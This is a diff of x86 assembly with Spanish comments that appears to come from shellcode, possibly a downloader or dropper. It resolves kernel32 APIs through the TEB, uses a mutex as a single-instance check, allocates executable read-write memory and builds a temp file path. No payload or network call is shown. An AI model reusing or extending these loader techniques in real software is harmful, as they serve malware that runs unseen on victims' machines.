@@ -130,6 +130,18 @@ gtfo:
 conti:
         ret
 #endif
+CreateBuff:
+        cdq                             //EDX = 0
+        push PAGE_EXECUTE_READWRITE     //v
+        pushc(MEM_COMMIT)               //v
+        push eax                        //v
+        push edx                        //v
+        call [ebp+_VirtualAlloc]        //>VirtualAlloc(0, SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+        #ifdef ERR_CHECK
+        push ERR_MEM                    //v
+        call gtfo                       //>(EAX!=0)? No ha habido error, tenemos donde guardar los datos
+        #endif
+        ret
 start:
         /*###############################################################################
         ** Creación del stack de direcciones:
@@ -244,7 +256,7 @@ find_kernel32_finished:
         push edx                        //v
         call [ebp+_CreateMutexA]        //> CreateMutexA(NULL, False, &HOST)
         cdq                             //EDX = 0
-        mov  edx, DWORD PTR FS:[edx + 0x18]//v
+        mov  edx, DWORD PTR FS:[edx+0x18]//v
         mov  eax, [edx+0x34]            //> GetLastError()
         #ifdef ERR_CHECK
         xor  al, 0xB7
@@ -258,32 +270,20 @@ nomtx:
         #endif
         #endif
 
-        jmp  end_createBuff
-        
-CreateBuff:
-        cdq                             //EDX = 0
-        push PAGE_EXECUTE_READWRITE     //v
-        pushc(MEM_COMMIT)               //v
-        push eax                        //v
-        push edx                        //v
-        call [ebp+_VirtualAlloc]        //>VirtualAlloc(0, SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-        #ifdef ERR_CHECK
-        push ERR_MEM                    //v
-        call gtfo                       //>(EAX!=0)? No ha habido error, tenemos donde guardar los datos
-        #endif
-        ret
-end_createBuff:
-
         push 512                        //v
-        pop  eax                        //EAX = 512
+        pop  eax                        //>EAX = 512
         call CreateBuff                 //Creamos Buffer para la ruta
-        mov  edi, eax                   //ECX = EAX
+        mov  edi, eax                   //EDI = EAX
+
+        push eax                        //v
+        push 512                        //v
+        call [ebp+_GetTempPathA]        //>GetTempPathA(512, Buff);
 
         cdq                             //EDX = 0
-        push ecx
-        push edx
-        push edx
-        push edi
+        push edi                        //v
+        push edx                        //v
+        push edx                        //v
+        push edi                        //v
         call [ebp+_GetTempFileNameA]    //>GetTempFileNameA(Buff, NULL, 0, Buff);
 
 #define BUFF_SIZE 0x1010101
